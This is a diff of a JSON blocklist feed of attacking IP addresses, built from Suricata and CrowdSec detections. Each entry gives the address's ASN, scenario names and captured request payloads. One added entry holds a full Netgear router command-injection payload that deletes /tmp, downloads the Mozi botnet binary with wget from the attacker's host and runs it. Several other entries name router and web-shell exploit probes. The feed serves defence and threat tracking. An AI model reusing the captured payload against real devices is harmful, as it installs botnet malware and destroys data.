@@ -1,52 +1,13 @@
 {
-  "generated_at": "2026-11-11T13:00:00Z",
+  "generated_at": "2026-11-12T01:00:00Z",
   "ttl_days": 7,
   "scope": "suricata",
   "counts": {
-    "total": 105,
-    "v4": 105,
+    "total": 108,
+    "v4": 108,
     "v6": 0
   },
   "items": [
-    {
-      "ip": "43.138.5.244",
-      "family": "v4",
-      "first_seen": "2026-11-04T17:00:00Z",
-      "last_seen": "2026-11-04T17:00:00Z",
-      "scenarios": [
-        "suricata/ET HUNTING X-Forward-For Header Set to localhost"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "45090",
-      "asn_name": "TENCENT-NET-AP - Shenzhen Tencent Computer Systems Company Limited",
-      "asn_prefix": "43.138.0.0/18",
-      "payloads": [
-        "GET /gcp.json"
-      ]
-    },
-    {
-      "ip": "20.65.219.69",
-      "family": "v4",
-      "first_seen": "2026-11-04T20:00:00Z",
-      "last_seen": "2026-11-04T20:00:00Z",
-      "scenarios": [
-        "suricata/ET SCAN Zmap User-Agent (Inbound)"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "20.64.0.0/10",
-      "tags": [
-        "mwl:cloud=\"azure\""
-      ],
-      "payloads": [
-        "GET /"
-      ]
-    },
     {
       "ip": "52.180.140.58",
       "family": "v4",
@@ -1766,6 +1727,7 @@
         "suricata"
       ],
       "asn": "41231",
+      "asn_name": "CANONICAL-AS Canonical Group Limited",
       "asn_prefix": "91.189.92.0/24"
     },
     {
@@ -1851,6 +1813,97 @@
       "asn": "154258",
       "asn_name": "TACKYON1-AS-AP - Tackyon Limited",
       "asn_prefix": "45.115.41.0/24"
+    },
+    {
+      "ip": "139.135.60.219",
+      "family": "v4",
+      "first_seen": "2026-11-11T21:00:00Z",
+      "last_seen": "2026-11-11T21:00:00Z",
+      "scenarios": [
+        "crowdsec/http-cve-probing",
+        "crowdsec/netgear_rce",
+        "suricata/SERVER-WEBAPP Netgear DGN1000 series routers authentication bypass attempt"
+      ],
+      "sources": [
+        "crowdsec",
+        "suricata"
+      ],
+      "asn": "9541",
+      "asn_name": "CYBERNET-AP - Cyber Internet Services (Pvt) Ltd.",
+      "asn_prefix": "139.135.60.0/24",
+      "payloads": [
+        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://139.135.60.219:40631/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
+        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://139.135.60.219:40631/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
+      ]
+    },
+    {
+      "ip": "85.217.140.0",
+      "family": "v4",
+      "first_seen": "2026-11-11T22:00:00Z",
+      "last_seen": "2026-11-11T22:00:00Z",
+      "scenarios": [
+        "suricata/ET SCAN Suspicious User-Agent Containing Web Scan/er Likely Web Scanner"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "209334",
+      "asn_name": "MODAT-01 Modat B.V.",
+      "asn_prefix": "85.217.140.0/24",
+      "payloads": [
+        "GET /"
+      ]
+    },
+    {
+      "ip": "139.135.59.202",
+      "family": "v4",
+      "first_seen": "2026-11-11T21:00:00Z",
+      "last_seen": "2026-11-11T21:00:00Z",
+      "scenarios": [
+        "suricata/ET EXPLOIT HackingTrio UA (Hello, World)"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "9541",
+      "asn_name": "CYBERNET-AP - Cyber Internet Services (Pvt) Ltd.",
+      "asn_prefix": "139.135.59.0/24",
+      "payloads": [
+        "POST /GponForm/diag_Form?images/"
+      ]
+    },
+    {
+      "ip": "87.97.172.55",
+      "family": "v4",
+      "first_seen": "2026-11-11T21:00:00Z",
+      "last_seen": "2026-11-11T21:00:00Z",
+      "scenarios": [
+        "suricata/SURICATA HTTP unable to match response to request"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "13124",
+      "asn_name": "A1BG_RSD A1 Bulgaria EAD",
+      "asn_prefix": "87.97.172.0/24"
+    },
+    {
+      "ip": "175.195.238.137",
+      "family": "v4",
+      "first_seen": "2026-11-11T23:00:00Z",
+      "last_seen": "2026-11-11T23:00:00Z",
+      "scenarios": [
+        "suricata/ET WEB_SERVER WebShell Generic - wget http - POST"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "4766",
+      "asn_name": "KIXS-AS-KR-KR - Korea Telecom",
+      "asn_prefix": "175.192.0.0/13",
+      "payloads": [
+        "POST /cgi-bin/ViewLog.asp"
+      ]
     }
   ]
 }
